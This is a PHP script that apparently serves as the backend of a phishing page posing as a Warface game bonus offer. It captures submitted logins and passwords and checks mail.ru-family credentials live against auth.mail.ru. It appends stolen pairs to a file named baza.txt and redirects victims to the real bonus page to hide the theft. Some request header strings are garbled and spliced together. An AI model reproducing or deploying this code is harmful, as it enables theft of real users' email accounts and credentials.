<?php
echo '<meta charset="utf-8">';
$login = $_POST['login']; 
    $password= $_POST['password'];
    $pieces = explode("@", $login);
    $domn= $pieces[1];
        $email = $login.";".$password;
if ($domn == "mail.ru" or $domn == "inbox.ru" or $domn == "list.ru" or $domn == "bk.ru"){
$headers = array
( 
'Host: auth.mail.ru',
'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
'Accept-Encoding: gzip, deflate',
'Connection: keep-alive',
'Content-Type: applU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
'Accept-Encoding: gzip, deflate',
'Connection: keep-alication/x-www-form-urlencoded',
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://auth.mail.ru/cgi-bin/auth?Domain='.$domn.'&Login='.$login.'&Password='.$password);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_NOBODY, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_NOPROGRESS, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, fopen("1.txt", "a"));
curl_setopt($ch, CURLOPT_COOKIEFILE, fopen("1.txt", "a"));
curl_setopt($ch, CURLOPT_WRITEHEADER, fopen("head.txt", "a"));
$data = curl_exec($ch);
curl_close($ch);


      $string = substr($data, 163, 1);
   if ($string == "S") {
    $good = "good";
   }
   else {
    $good = "bad";
   }


if ($good == "good"){

	$file = fopen('baza.txt','a+');
    fwrite($file,"$login:$password\n");
    fclose($file);
    print '<script>document.location.replace("https://wf.mail.ru/bonus/");</script>';
	}
	else
	{
print '<script>document.location.replace("/wf");</script>';
	}
}
elseif ($domn==""){
print '<script>document.location.replace("/wf");</script>';	
}
else{
$file = fopen('baza.txt','a+');
    fwrite($file,"$login:$password\n");
    fclose($file);
print '<script>document.location.replace("https://wf.mail.ru/bonus/");</script>';	
}
  ?>